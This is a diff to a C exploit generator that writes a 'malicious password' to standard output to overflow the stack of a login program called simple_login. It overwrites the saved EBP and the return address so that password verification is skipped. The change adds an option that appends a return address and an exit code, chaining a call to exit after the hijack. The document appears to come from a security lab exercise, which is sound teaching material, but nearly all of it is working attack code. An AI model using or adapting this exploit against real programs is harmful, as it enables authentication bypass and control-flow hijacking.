@@ -5,6 +5,7 @@
 #define _XOPEN_SOURCE  // getopt
 
 #include <alloca.h>
+#include <assert.h>
 #include <ctype.h>  // isspace
 #include <endian.h>  // htole32
 #include <errno.h>
@@ -71,9 +72,10 @@ static inline int parse_hex32(uint32_t *result, const char *arg) {
 
 int main(int argc, char **argv) {
 	int do_ebp = 0;
+	int do_exit = -1;
 	int correct_password = 0;
 	uint32_t ebp = 0;
-	for(int opt; (opt = getopt(argc, argv, "b:v")) != -1;) {
+	for(int opt; (opt = getopt(argc, argv, "b:e::v")) != -1;) {
 		switch(opt) {
 		case 'b':
 			if(parse_hex32(&ebp, optarg) < 0) {
@@ -81,6 +83,18 @@ int main(int argc, char **argv) {
 				goto usage;
 			}
 			do_ebp = 1;
+			break;
+		case 'e':
+			if(optarg) {
+				int error = 0;
+				do_exit = parse_ulong(optarg, 0, INT_MAX, &error);
+				if(error) {
+					fprintf(stderr, "cannot parse %s: %s\n", optarg, strerror(errno));
+					goto usage;
+				}
+			} else {
+				do_exit = 0;
+			}
 			break;
 		case 'v':
 			correct_password = 1;
@@ -98,19 +112,25 @@ int main(int argc, char **argv) {
 	if(parse_hex32(&jump_addr, argv[optind]) < 0) {
 		fprintf(stderr, "cannot parse %s: %s\n", argv[optind], strerror(errno));
 	usage:
-		fprintf(stderr, "Usage: %s [-b EBP] [-v] HEX_ADDRESS\n", argv[0]);
+		fprintf(stderr, "Usage: %s [-b EBP] [-e[EXIT_CODE]] [-v] HEX_ADDRESS\n", argv[0]);
 		return 2;
 	}
 	++optind;
 
+	size_t extra_size = 0;
 	if(optind + 1 < argc) {
 		fprintf(stderr, "unexpected argument: %s\n", argv[optind + 1]);
 		goto usage;
 	}
 
+	if(do_exit >= 0) {
+		// exit's argument and return address
+		extra_size = 2 * sizeof(uint32_t);
+	}
+
 	// create buffer including return address
 	const size_t size = ADDR_END_STACKFRAME - ADDR_PASSWORD;
-	char *const buf = alloca(size);
+	char *const buf = alloca(size + extra_size);
 
 	// We must not provide the correct password, simple_login's verify_password
 	// must return 0. The return value of verify_password is stored in %eax and
@@ -139,7 +159,19 @@ int main(int argc, char **argv) {
 		*ebp_ptr = htole32(ebp);
 	}
 
-	for(char *c = buf; c < buf + size; ++c) {
+	if(do_exit >= 0) {
+		uint32_t *stack = (uint32_t *)(buf + size);
+		// return address
+		assert((char *)stack < buf + size + extra_size);
+		*stack++ = htole32(-1);
+		// exit code
+		assert((char *)stack < buf + size + extra_size);
+		*stack++ = htole32(do_exit);
+
+		assert((char *)stack == buf + size + extra_size);
+	}
+
+	for(char *c = buf; c < buf + size + extra_size; ++c) {
 		if(isspace(*c)) {
 			fprintf(stderr, "%s: scanf is cursed on so many levels, for some reason it ignores white-space in the input, so your command might not work correctly.\n", argv[0]);
 			fprintf(stderr, "%s: \"Input white-space bytes shall be skipped, unless the conversion specification includes a [, c, C, or n conversion specifier.\"\n", argv[0]);
@@ -149,7 +181,7 @@ int main(int argc, char **argv) {
 	}
 
 	// write the malicious password to standard output
-	size_t pending = size;
+	size_t pending = size + extra_size;
 	for(char *p = buf; pending > 0;) {
 		ssize_t written = write(STDOUT_FILENO, p, pending);
 		if(written < 0) {
